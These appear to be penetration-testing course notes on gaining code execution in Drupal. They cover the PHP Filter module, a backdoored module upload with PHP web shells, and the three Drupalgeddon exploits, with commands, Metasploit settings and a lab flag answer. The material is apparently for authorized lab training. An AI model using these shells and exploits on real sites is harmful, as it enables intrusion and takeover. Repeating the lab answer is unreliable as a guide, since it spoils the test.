# Section 8 — Attacking Drupal

## ID
536

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 8 — Attacking Drupal

## Description
Covers Drupal exploitation via the PHP Filter module, backdoored module uploads, and three Drupalgeddon vulnerabilities (CVE-2014-3704, CVE-2018-7600, CVE-2018-7602) for pre/post-auth RCE.

## Tags
drupal, rce, drupalgeddon, php-filter, module-upload, cve

## Commands
- `curl -s http://<TARGET>/node/3?<PARAM>=id`
- `python2.7 drupalgeddon.py -t http://<TARGET> -u <USER> -p <PASS>`
- `python3 drupalgeddon2.py`
- `curl http://<TARGET>/mrb3n.php?<PARAM>=id`
- `curl -s http://<TARGET>/modules/captcha/shell.php?<PARAM>=id`
- `echo '<?php system($_GET[<PARAM>]);?>' | base64`

## What This Section Covers
Multiple methods to achieve RCE on Drupal: enabling the PHP Filter module to execute PHP via content pages (Drupal 7 built-in, Drupal 8 requires manual install), uploading a backdoored module with a .htaccess bypass, and exploiting the three Drupalgeddon CVEs. Unlike WordPress/Joomla, Drupal doesn't have a simple theme editor for direct PHP injection.

## Methodology

### Method 1: PHP Filter Module (Drupal 7 — built-in)
1. Log in as admin → Modules → enable **PHP filter** → Save configuration
2. Content → Add content → Basic page
3. In body, add PHP web shell:
   ```php
   <?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
   ```
4. Set **Text format** dropdown to **PHP code** → Save
5. Access the new node URL with the parameter:
   ```
   curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
   ```

### Method 2: PHP Filter Module (Drupal 8 — manual install)
1. Download PHP Filter module: `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Admin → Reports → Available updates (or Extend) → Install → upload the tar.gz
3. Enable the module under Extend
4. Create a Basic page with PHP code text format (same as Method 1)

### Method 3: Backdoored Module Upload
1. Download a legitimate module (e.g., CAPTCHA):
   ```
   wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
   tar xvf captcha-8.x-1.2.tar.gz
   ```
2. Create `shell.php`:
   ```php
   <?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
   ```
3. Create `.htaccess` (needed because Drupal blocks direct `/modules` access):
   ```
   <IfModule mod_rewrite.c>
   RewriteEngine On
   RewriteBase /
   </IfModule>
   ```
4. Add both files to the module and repackage:
   ```
   mv shell.php .htaccess captcha
   tar cvf captcha.tar.gz captcha/
   ```
5. Admin → Manage → Extend → Install new module → upload archive
6. Access shell: `curl -s http://<TARGET>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Method 4: Drupalgeddon (CVE-2014-3704) — Pre-auth SQLi → Admin
- **Affects**: Drupal 7.0–7.31 (fixed in 7.32)
- **Type**: Pre-authenticated SQL injection
- Creates a new admin user:
  ```
  python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
  ```
- Then log in and use PHP Filter (Method 1) for RCE
- Metasploit: `exploit/multi/http/drupal_drupageddon`

### Method 5: Drupalgeddon2 (CVE-2018-7600) — Pre-auth RCE
- **Affects**: Drupal < 7.58 and < 8.5.1
- **Type**: Unauthenticated RCE via insufficient input sanitization during user registration
- PoC uploads a file to webroot. Modify the script to upload a PHP shell:
  ```
  echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
  ```
  Replace the echo command in the exploit with:
  ```
  echo "<BASE64>" | base64 -d | tee mrb3n.php
  ```
- Run exploit, then: `curl http://<TARGET>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Method 6: Drupalgeddon3 (CVE-2018-7602) — Auth RCE
- **Affects**: Multiple Drupal 7.x and 8.x versions
- **Type**: Authenticated RCE (requires user with node delete permission)
- **Requires**: Valid session cookie (grab from browser dev tools)
- Metasploit:
  ```
  use exploit/multi/http/drupal_drupageddon3
  set VHOST drupal-acc.inlanefreight.local
  set DRUPAL_SESSION SESS45ecfcb93a...=jaAPbanr2KhL...
  set DRUPAL_NODE 1
  ```

## Drupalgeddon Summary

| CVE | Name | Auth Required | Drupal Versions | Attack Type |
|-----|------|--------------|-----------------|-------------|
| CVE-2014-3704 | Drupalgeddon | No | 7.0–7.31 | SQLi → create admin → RCE via PHP Filter |
| CVE-2018-7600 | Drupalgeddon2 | No | < 7.58, < 8.5.1 | Direct RCE via user registration input |
| CVE-2018-7602 | Drupalgeddon3 | Yes | Multiple 7.x/8.x | RCE via Form API (needs session cookie + node) |

## CMS RCE Comparison

| CMS | RCE Method | Path |
|-----|-----------|------|
| WordPress | Theme Editor → edit 404.php | `/wp-content/themes/<theme>/404.php` |
| Joomla | Template Editor → edit error.php | `/templates/<theme>/error.php` |
| Drupal | PHP Filter + Content page / Module upload | `/node/<id>` or `/modules/<mod>/shell.php` |

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 (Attacking Drupal): flag.txt in /var/www/drupal.inlanefreight.local | DrUp@l_drUp@l_3veryWh3Re! | Login admin:admin → Extend → enable PHP Filter → Content → Add Basic page with PHP reverse shell (text format: PHP code) → Save triggers callback → `cat flag_*.txt` |

## Key Takeaways

- **Drupal RCE is harder than WordPress/Joomla** — no direct theme/template file editor; must use PHP Filter module, module upload, or CVE exploits
- **PHP Filter is built-in on Drupal 7 but must be manually installed on Drupal 8+** — this is a significant difference between versions
- **Backdoored module upload requires a .htaccess file** — without it, Drupal blocks direct access to `/modules/` directory
- **Drupalgeddon (CVE-2014-3704) is pre-auth** — creates admin user via SQLi, then chain with PHP Filter for RCE
- **Drupalgeddon2 is the most dangerous** — pre-auth direct RCE, no credentials needed at all
- **Always use non-obvious web shell parameter names** (MD5 hashes) across all CMS attacks — applies to WordPress, Joomla, and Drupal equally
- **Clean up after exploitation**: disable PHP Filter, delete created pages/nodes, remove uploaded modules, document all artifacts

## Gotchas

- On Drupal 8, you must **install** the PHP Filter module before you can enable it — it's not bundled like in Drupal 7
- When creating a Basic page with PHP, you must change the **Text format** dropdown to "PHP code" — leaving it on default won't execute the PHP
- The Drupalgeddon2 PoC script's built-in command execution may not work — but the file upload succeeds, so use cURL to interact with the uploaded shell
- Drupalgeddon3 requires a valid **session cookie** — grab it from browser dev tools (Storage → Cookies) after authenticating
- The lab flag file is at `/var/www/drupal.inlanefreight.local/` (the drupal vhost, not drupal-qa or drupal-dev) — use `admin:admin` creds on `drupal.inlanefreight.local`
